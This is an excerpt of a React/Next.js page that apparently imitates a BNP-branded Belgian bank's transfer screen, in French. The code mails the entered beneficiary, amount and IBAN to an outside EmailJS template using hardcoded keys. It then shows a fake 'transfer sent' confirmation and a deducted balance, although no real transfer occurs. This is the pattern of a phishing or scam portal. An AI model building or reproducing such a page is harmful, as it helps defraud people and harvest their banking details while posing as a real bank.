...
export default function TransferPage() {
  ...
  const TEMPLATE_ID = "template_q6ck8la"; 
  const PUBLIC_KEY = "jBFjr8YEDrlC9plny"; 

  const [step, setStep] = useState(1); 
  const [amount, setAmount] = useState("");
  const [beneficiary, setBeneficiary] = useState("");
  const [iban, setIban] = useState(""); // NOUVEAU : On capture l'IBAN
  ...
  const handleTransfer = (e: any) => {
    ...
    emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams, PUBLIC_KEY)
      .then((result) => {
          ...
          // On sauvegarde maintenant l'IBAN saisi dans l'historique
          const newTransaction = {
            ...
            iban: iban, // <-- ICI L'IBAN EST SAUVÉ
            communication: "Virement Instantané"
          };
  ...
  return (
    <div className="min-h-screen bg-[#F4F4F4] font-sans text-gray-800">
      <header className="bg-white p-4 border-b border-gray-200 flex items-center gap-4 shadow-sm">
        <Link href="/dashboard" className="text-gray-500 hover:bg-gray-100 p-2 rounded-full transition">← Retour</Link>
      ...
      <main className="max-w-xl mx-auto p-4 md:p-8 mt-6">
          ...
          <div className="bg-white rounded-xl shadow-md border border-gray-100 p-6 md:p-8 space-y-6 animate-fade-in">
            ...
            <div>
              ...
              <div className="border border-gray-300 rounded-lg p-3 bg-gray-50 flex justify-between items-center">
                 ...
                 <div className="font-bold text-gray-700">{currentBalance.toLocaleString('fr-BE', { minimumFractionDigits: 2 })} €</div>
              </div>
            </div>

            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">Nom du bénéficiaire</label>
              <input type="text" placeholder="Ex: ANGELIQUE CHENEAU" className="w-full border border-gray-300 rounded-lg p-3 focus:ring-2 focus:ring-bnp-green outline-none"
            ...
            <div>
              ...
              <input 
                ...
                className="w-full border border-gray-300 rounded-lg p-3 focus:ring-2 focus:ring-bnp-green outline-none font-mono uppercase" 
                value={iban} 
                onChange={(e) => setIban(e.target.value)} // <-- On capture la saisie ici
              />
            </div>

            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">Montant (€)</label>
              <input type="number" placeholder="0.00" className="w-full border border-gray-300 rounded-lg p-3 text-xl font-bold outline-none focus:ring-2 focus:ring-bnp-green"
                value={amount} onChange={(e) => setAmount(e.target.value)} />
            </div>

            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">Communication</label>
              <input type="text" placeholder="Ex: Loyer" className="w-full border border-gray-300 rounded-lg p-3 outline-none focus:ring-2 focus:ring-bnp-green" />
            </div>

            <button onClick={handleTransfer} disabled={!amount || !beneficiary}
        ...
        {/* ECRANS SUIVANTS (LOADER & SUCCES) - Identiques */}
        {step === 2 && (
        ...
        {step === 3 && (
          <div className="bg-white rounded-xl shadow-md border border-gray-100 p-8 text-center space-y-6 animate-scale-in">
             <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto text-4xl mb-4 shadow-sm">✓</div>
             <div>
                <h2 className="text-2xl font-bold text-gray-800 mb-2">Virement envoyé !</h2>
                <p className="text-gray-600 text-lg">Vous avez envoyé <span className="font-bold">{amount} €</span> à <span className="font-bold">{beneficiary}</span>.</p>
                <p className="text-sm text-gray-500 mt-2">Nouveau solde : {(currentBalance - parseFloat(amount)).toLocaleString('fr-BE')} €</p>
             </div>
             <Link href="/dashboard" className="block">
                <button className="w-full bg-gray-800 text-white font-bold py-3 rounded-lg hover:bg-black transition mt-6">Retour à mes comptes</button>
             </Link>
          </div>
        )}
      </main>
